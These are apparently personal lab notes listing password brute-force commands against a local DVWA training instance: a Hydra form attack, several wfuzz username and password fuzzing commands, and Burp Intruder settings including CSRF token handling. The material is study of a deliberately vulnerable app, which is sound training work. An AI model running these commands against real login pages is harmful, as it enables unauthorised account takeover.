# Brute Force Lab — Commands

> All commands in this document were executed against my local DVWA laboratory environment.

---

## 1. Hydra — Password Brute Force

```bash
hydra -l admin -P /home/opareta/jinda_bible/Lab/Appsec/dvwa/bruteforce/passwords.txt -s 4280 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."

Explanation
-l admin

Username.

-P passwords.txt

Password wordlist.

-s 4280

DVWA port.

127.0.0.1

Local target.

http-get-form

Hydra HTTP GET form module.

^USER^

Username placeholder.

^PASS^

Password placeholder.

F=Username and/or password incorrect.

Failure condition.

2. WFuzz — Password
wfuzz -c -w "/home/opareta/jinda_bible/Lab/Appsec/dvwa/bruteforce/passwords.txt" \
-H "Cookie: PHPSESSID=<SESSION>; security=low" \
"http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login"
3. WFuzz — Username
wfuzz -c -w "/home/opareta/jinda_bible/Lab/Appsec/dvwa/bruteforce/users.txt" \
-H "Cookie: PHPSESSID=<SESSION>; security=low" \
"http://127.0.0.1:4280/vulnerabilities/brute/?username=FUZZ&password=password&Login=Login"
4. WFuzz — Username + Password
wfuzz -c --hs "incorrect" \
-z file,users.txt \
-z file,/usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt \
-H "Cookie: PHPSESSID=<SESSION>; security=low" \
"http://127.0.0.1:4280/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login"
Payloads
FUZZ  = username
FUZ2Z = password
Filter
--hs "incorrect"

Hides responses containing the failure message.

5. Burp Intruder — Low

Request:

GET /vulnerabilities/brute/?username=admin&password=§PASSWORD§&Login=Login HTTP/1.1

Payload:

password

Grep-Match:

incorrect
6. Burp Intruder — High

Attack type:

Cluster bomb

Payload positions:

username = Payload 1
password = Payload 2

CSRF token:

user_token

The token was handled using:

Burp Macro
+
Session Handling Rule
